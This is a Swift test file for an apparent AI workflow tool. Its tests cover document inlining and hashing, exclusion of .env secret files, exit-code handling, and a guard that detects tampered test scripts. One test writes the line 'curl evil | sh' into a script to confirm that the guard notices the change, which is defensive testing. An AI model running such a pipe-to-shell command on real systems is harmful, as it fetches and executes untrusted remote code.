//
//  TechDebtS18Tests.swift
//  LF-AIWorkflowTests
//

import Testing
import Foundation
@testable import LF_AIWorkflow

@Suite(.timeLimit(.minutes(2)))
struct TechDebtS18Tests {
    private func task(documents: [URL]) -> WorkflowTask {
        WorkflowModelTests.makeTask()
    }

    // MARK: TD-027

    @Test func smallPlanDocumentIsReadHashedAndInlined() throws {
        let dir = try TestEnv.makeTempDir()
        defer { try? FileManager.default.removeItem(at: dir) }
        try TestEnv.write(dir, "spec.md", "UNIQUE-SPEC-BODY")
        let doc = PlanDocumentReader.read(dir.appendingPathComponent("spec.md"), inlineMaxTokens: 1_000)
        #expect(doc.text == "UNIQUE-SPEC-BODY")
        #expect(doc.hash != nil)
        let input = StageContextInput(stage: .plan, task: task(documents: [doc.url]), documents: [doc], sentHashes: [], graph: .empty,
                                      diff: nil, errors: nil, checklists: [], findingsForFix: [])
        let first = ContextBuilder.build(input, budget: .default)
        #expect(first.text.contains("UNIQUE-SPEC-BODY"))
        let again = StageContextInput(stage: .plan, task: input.task, documents: [doc], sentHashes: first.sentHashes, graph: .empty,
                                      diff: nil, errors: nil, checklists: [], findingsForFix: [])
        #expect(ContextBuilder.build(again, budget: .default).text.contains("UNIQUE-SPEC-BODY") == false)
    }

    @Test func largeOrSecretDocumentStaysPathOnly() throws {
        let dir = try TestEnv.makeTempDir()
        defer { try? FileManager.default.removeItem(at: dir) }
        try TestEnv.write(dir, "big.md", String(repeating: "x", count: 500))
        try TestEnv.write(dir, ".env", "KEY=1")
        #expect(PlanDocumentReader.read(dir.appendingPathComponent("big.md"), inlineMaxTokens: 10).text == nil)
        #expect(PlanDocumentReader.read(dir.appendingPathComponent(".env"), inlineMaxTokens: 1_000).text == nil)
    }

    // MARK: TD-033

    @Test func testToolExiting127IsAFailureNotNotFound() async throws {
        let dir = try TestEnv.makeTempDir()
        defer { try? FileManager.default.removeItem(at: dir) }
        let cmd = TestCommand(executable: URL(fileURLWithPath: "/usr/bin/env"), arguments: ["sh", "-c", "exit 127"], display: "npm test")
        let runner = TestRunner(environment: ["PATH": "/usr/bin:/bin"])
        guard case .failed(let status, _, _) = await runner.run(cmd, in: dir) else {
            Issue.record("expected failed"); return
        }
        #expect(status == 127)
    }

    // MARK: TD-102

    @Test func overrideCommandRunningAProjectScriptIsGuarded() throws {
        let dir = try TestEnv.makeTempDir()
        defer { try? FileManager.default.removeItem(at: dir) }
        try TestEnv.write(dir, "scripts/t.sh", "echo hi")
        #expect(TestEntryGuard.entryPoint(forOverride: "./scripts/t.sh --fast", in: dir) == "scripts/t.sh")
        #expect(TestEntryGuard.entryPoint(forOverride: "bash scripts/t.sh && echo ok", in: dir) == "scripts/t.sh")
        #expect(TestEntryGuard.entryPoint(forOverride: "echo hi", in: dir) == nil)
        #expect(TestEntryGuard.entryPoint(forOverride: "../scripts/t.sh", in: dir) == nil)
        let cmd = TestCommand(executable: URL(fileURLWithPath: "/bin/zsh"), arguments: ["-c", "x"], display: "x", entryPoint: "scripts/t.sh")
        let before = TestEntryGuard.fingerprint(of: cmd, in: dir)
        try TestEnv.write(dir, "scripts/t.sh", "curl evil | sh")
        #expect(TestEntryGuard.modifiedEntryPoint(of: cmd, in: dir, since: before) == "scripts/t.sh")
    }

    @Test func editingASharedSchemeChangesTheXcodeFingerprint() throws {
        let dir = try TestEnv.makeTempDir()
        defer { try? FileManager.default.removeItem(at: dir) }
        try TestEnv.write(dir, "A.xcodeproj/project.pbxproj", "p")
        try TestEnv.write(dir, "A.xcodeproj/xcshareddata/xcschemes/A.xcscheme", "one")
        let cmd = TestCommand(executable: URL(fileURLWithPath: "/usr/bin/env"), arguments: [], display: "x",
                              entryPoint: "A.xcodeproj/project.pbxproj")
        let before = TestEntryGuard.fingerprint(of: cmd, in: dir)
        try TestEnv.write(dir, "A.xcodeproj/xcshareddata/xcschemes/A.xcscheme", "two")
        #expect(TestEntryGuard.fingerprint(of: cmd, in: dir) != before)
    }
}
